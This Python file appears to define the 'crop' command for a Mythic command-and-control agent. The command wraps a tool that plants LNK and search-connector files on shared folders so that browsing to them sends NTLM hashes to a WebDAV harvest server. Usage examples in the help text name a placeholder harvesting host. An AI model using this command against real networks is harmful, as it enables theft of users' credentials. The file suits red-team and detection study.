from mythic_payloadtype_container.MythicCommandBase import *
import json


class FarmerArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line)
        self.args = [
            CommandParameter(
                name="targetLocation",
                type=ParameterType.String,
                description="The location to drop the file",
                parameter_group_info=[ParameterGroupInfo(
                        required=True,
                        ui_position=0,
                        group_name="Default"
                    ),
                ],
                
            ),
            CommandParameter(
                name="targetFilename",
                type=ParameterType.String,
                description="The filename",
                parameter_group_info=[ParameterGroupInfo(
                        required=True,
                        ui_position=1,
                        group_name="Default"
                    ),
                ],
                
            ),
            CommandParameter(
                name="targetPath",
                type=ParameterType.String,
                description="Webdav path location",
                parameter_group_info=[ParameterGroupInfo(
                        required=True,
                        ui_position=2,
                        group_name="Default"
                    ),
                ],
                
            ),
            CommandParameter(
                name="targetIcon",
                type=ParameterType.String,
                description="LNK Icon location",
                default_value = "",
                parameter_group_info=[ParameterGroupInfo(
                        required=False,
                        ui_position=3,
                        group_name="Default"
                    ),
                ],
            ),
            CommandParameter(
                name="recurse",
                type=ParameterType.Boolean,
                default_value = False,
                description="Write the file to every sub folder of the specified path",
                parameter_group_info=[ParameterGroupInfo(
                        required=False,
                        ui_position=4,
                        group_name="Default"
                    ),
                ],
            ),
            CommandParameter(
                name="clean",
                type=ParameterType.Boolean,
                default_value = False,
                description="Remove the file from every sub folder of the specified path",
                parameter_group_info=[ParameterGroupInfo(
                        required=False,
                        ui_position=4,
                        group_name="Default"
                    ),
                ],
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("port", self.command_line.split()[0])
        else:
            raise ValueError("Missing arguments")


class FarmerCommand(CommandBase):
    cmd = "crop"
    needs_admin = False
    help_cmd = "crop"
    description = "Drop a file for hash collection"
    version = 1
    is_exit = False
    help_cmd = """
Crop https://github.com/mdsecactivebreach/Farmer
    created by @domchell

Crop is a tool that can create LNK files that initiate a WebDAV connection when browsing to a folder where it's stored.

Supported LNK types: .lnk, .url, .library-ms, .searchconnect-ms

Drop an LNK file
crop -targetLocation \\myserver\shared\ -targetFilename Athena.lnk -targetPath \\MyCropServer:8080\harvest -targetIcon \\MyCropServer:8080\harvest\my.ico

Drop a .searchconnect-ms
crop -targetLocation \\myserver\shared\ -targetFilename Athena.searchconnector-ms -targetPath \\MyCropServer:8080\harvest -recurse      
    """
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_remove_file = False
    is_upload_file = False
    author = "@domchell, @checkymander"
    argument_class = FarmerArguments
    attackmapping = []
    attributes = CommandAttributes(
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass